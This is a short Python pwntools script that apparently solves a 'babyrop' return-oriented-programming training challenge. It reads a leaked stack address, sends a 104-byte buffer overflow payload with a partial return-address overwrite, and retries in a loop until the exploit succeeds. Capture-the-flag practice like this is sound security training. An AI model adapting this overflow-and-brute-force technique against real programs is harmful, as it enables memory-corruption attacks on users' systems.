from pwn import *

while True:
        p = process('/challenge/babyrop_level11.1')
        #gdb.attach(p,'''break challenge''')
        sleep(1)
        s = p.recv()[-17:-3].decode()
        print(s)
        leak_stack = int(s,16)
        win = leak_stack - 8
 
        payload = b'a'*104 + p64(win-8) + b'\xe6\xee'
 
        p.send(payload)
        sleep(0.5)
        s = p.recv().decode()

        if 'pwn' in s:
                print(s)
                break
        else:
                print(s)
                p.close()
                continue
